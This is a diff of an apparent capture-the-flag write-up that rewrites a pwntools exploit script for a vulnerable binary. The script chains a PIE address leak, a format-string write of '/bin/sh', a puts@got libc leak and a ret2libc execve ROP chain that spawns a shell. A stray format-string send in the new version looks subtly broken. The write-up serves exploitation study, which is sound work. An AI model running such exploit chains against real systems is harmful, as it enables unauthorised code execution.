@@ -74,61 +74,133 @@ After obtaining the libc base:
 
 ```python
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
 from pwn import *
 
-exe = context.binary = ELF('main')
-libc = ELF('libc.so.6')  # Ensure you’re using the matching libc version
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'main')
 
-def start():
-    return process([exe.path])
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+# Use the specified remote libc version unless explicitly told to use the
+# local system version with the `LOCAL_LIBC` argument.
+# ./exploit.py LOCAL LOCAL_LIBC
+if args.LOCAL_LIBC:
+    libc = exe.libc
+else:
+    library_path = libcdb.download_libraries('libc.so.6')
+    if library_path:
+        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
+        libc = exe.libc
+    else:
+        libc = ELF('libc.so.6')
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:      Full RELRO
+# Stack:      No canary found
+# NX:         NX enabled
+# PIE:        PIE enabled
+# Stripped:   No
 
 io = start()
 
-# Step 1: Leak username pointer & calculate PIE base
+# -----------------------[STEP 1 : LEAK USERNAME ADDRESS AND EXE_BASE ADDRESS]-----------------------
 io.recvuntil(b">> Auth Token = ")
-username_ptr = int(io.recvline().strip(), 16)
-exe.address = username_ptr - exe.sym['username']
-log.success(f"username @ {hex(username_ptr)}")
-log.success(f"PIE base @ {hex(exe.address)}")
+username_ptr = io.recvline().strip()
+username_ptr = int(username_ptr,16)
 
-# Step 2: Format String to Write "/bin/sh"
+exe.address = username_ptr - exe.sym['username']
+
+log.info(f"username@ : {hex(username_ptr)}")
+log.info(f"exe.base@ : {hex(exe.address)}")
+
+# ------------------[STEP 2 : OVERWRITE USERNAME WITH /BIN/SH USING FMTSTR_PAYLOAD]------------------
+
 io.recvuntil(b">> [C2] Enter your callsign to proceed:")
-payload = fmtstr_payload(6, {username_ptr: u64(b"/bin/sh\x00")})
+
+
+payload=fmtstr_payload(6, {username_ptr:u64(b"/bin/sh\x00")})
 io.sendline(payload)
 
-# Step 3: Leak puts@got using ROP
-io.recvuntil(b">> [C2] Access granted. Standby for remote operation sequence...")
-
+# -----------------------[STEP 3 : LEAK LIBC_BASE ADDRESS USING PUTS(PUTS@GOT)]-----------------------
 rop = ROP(exe)
 rop.call(exe.plt['puts'], [exe.got['puts']])
-rop.call(exe.sym['main'])
+rop.call(exe.symbols['main'])
 
-payload = b"A" * 88
-payload += rop.chain()
-io.sendline(payload)
+offset = 88
 
-# Read and parse puts leak
-for _ in range(4): io.recvline()
-leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
-libc.address = leaked_puts - libc.sym['puts']
-log.success(f"Leaked puts: {hex(leaked_puts)}")
-log.success(f"libc base: {hex(libc.address)}")
-
-# Step 4: ret2libc to execve("/bin/sh", NULL, NULL)
-rop = ROP(libc)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
-pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
-syscall = rop.find_gadget(['syscall'])[0]
-
-payload = b"A" * 88
-payload += p64(pop_rdi) + p64(username_ptr)
-payload += p64(pop_rsi_r15) + p64(0) + p64(0)
-payload += p64(pop_rax) + p64(59)
-payload += p64(syscall)
+payload = flat(
+    b'A' * offset,
+    rop.chain()
+)
 
 io.sendline(payload)
+
+for i in range(0,4):
+    io.recvline()
+
+
+leak=io.recvline()
+leaked_puts = u64(leak[:-1].ljust(8, b'\x00'))
+log.success(f"Leaked puts@libc: {hex(leaked_puts)}")
+libc.address = leaked_puts - libc.symbols['puts']
+log.success(f"Libc base: {hex(libc.address)}")
+
+# ---------------------------------------[STEP 4 : RET2LIBC ]---------------------------------------
+rop = ROP([exe, libc])
+
+pop_rax       = rop.find_gadget(['pop rax', 'ret'])[0]
+pop_rdi       = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi_r15   = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
+
+syscall_gadget = rop.find_gadget(['syscall'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+io.sendline(b'%p.%p.')
+io.recvuntil(b">> [C2] Access granted. Standby for remote operation sequence...")
+
+offset = 88
+payload = b"A" * offset
+
+payload += p64(pop_rdi)
+payload += p64(username_ptr)
+
+payload += p64(pop_rsi_r15)
+payload += p64(0)
+payload += p64(0)
+payload += p64(pop_rax)
+payload += p64(59)
+payload += p64(syscall_gadget)
+
+io.sendline(payload)
+
+
+
 io.interactive()
+
 ```
 
 ---
